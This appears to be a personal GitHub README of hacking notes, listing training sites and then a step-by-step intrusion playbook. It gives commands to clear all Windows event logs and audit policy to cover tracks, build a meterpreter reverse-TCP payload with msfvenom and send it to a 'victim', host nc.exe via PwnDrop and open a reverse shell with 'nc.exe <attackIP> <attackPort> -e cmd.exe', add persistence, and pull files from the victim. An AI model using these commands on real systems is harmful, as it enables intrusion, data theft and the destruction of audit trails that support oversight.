# sturdy-guacamole
Tools &amp; Notes I like or need for System Security and/or Hacking

# What I am using for learning/training
```
www.cbtnuggets.com | Great Training 
www.testout.com | Great Training & labs | HIGHLY RECOMMENDED! SIgn up for the Monthly deal: use my referral here: 
www.teamtreehouse.com | More for Coding 
www.scrimba.com | Coding in a beautiful way
www.tryhackme.com | Hacking Learnt in an awesome way
www.hackthebox.eu | This is a really great tool for Easy-Expert CTFs - from Hardware - Full On Battles, however Try Hack Me is more suited for walkthroughs.
https://app.infosecinstitute.com/portal/skills/home | Sign up for the monthly deal 
```
I will organize this better later on but for now it's just thoughts which will be later organized:

Use NTFS | Alternate Data Streams to cover tracks once you have gained access and are finished - a few ways: 

# Using Admininstrator - Powershell 
This is gathering all the Entries Log for us to view what we did/or changed. Which we will then Delete, respectively.
```
> Get-EventLog -LogName *
> Get-EventLog -LogName * | ForEach { Clear-EventLog $_.log } 
```
N0w if we need to view the System Audit Policy we can do that below and then clear it: 
```
> auditpol /get /category:* <br>
> auditpol /clear /y
```
# Compile C Script
Linux
```
> gcc -o shell-exploit shell.c 
```
Windows
```
> i686-w64-mingw32-gcc win_script.c -o win_script.exe -lws2_32
````
# msfvenom
Basic Reverse TCP Shell
```
> msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > fileNamed.exe
```
Usage
```
msf6> use exploit/multi/handler
msf6> set payload windows/meterpreter/reverse_tcp
msf6> options
msf6> exploit
```
Go to victim computer or send to victim or pwndrop and download/run the .exe file
<br>
When shelled:
```
C:\> getuid
C:\> sysinfo
C:\> download secretFile.txt
C:\> upload secretPayload.txt
```
# Moving Files
Samba Share (SMB)<br>
PwnDrop - ip_address:pwndrop<br>
SSH/SCP - pretty simple
Meterpreter

# PwnDrop Usage
1st - 
```
You need to update the PwnDrop.ini file after install (Configuration to update your IP and Port)
```
2nd -
```
# cd /home/kali/tools/PwnDrop/build
```
3rd - 
```
# ./pwndrop start
```
4th - 
```
Go to 127.0.0.1:pwndrop <br>
```
5th -
```
[/home/kali/tools/pwndrop/build] # locate nc.exe 
[/home/kali/tools/pwndrop/build] # /usr/share/windows-resources/binaries/nc.exe
```
6th - 
```
Upload to PwnDrop (Upload Folder)<br>
```
7th - 
```
Go to victim computer -> access ServerIP link (IP Address:pwndrop)
```
8th - 
```
(Save file to C:\ drive)
> run cmd.exe as admin
> cd C:\
> dir (should see file)
```
9th - Go to attack box
```
# nc -nlvp 4444
```
10th - Go to victim box
```
> nc.exe <attackIP> <attackPort> -e cmd.exe
```
11th - Do whatever, you're in. You should upload a .bat file to persisitantly run every few hours for a shell.
<br>
<br>
12th - Upload any files from Victim to Attacker via PwnDrop.






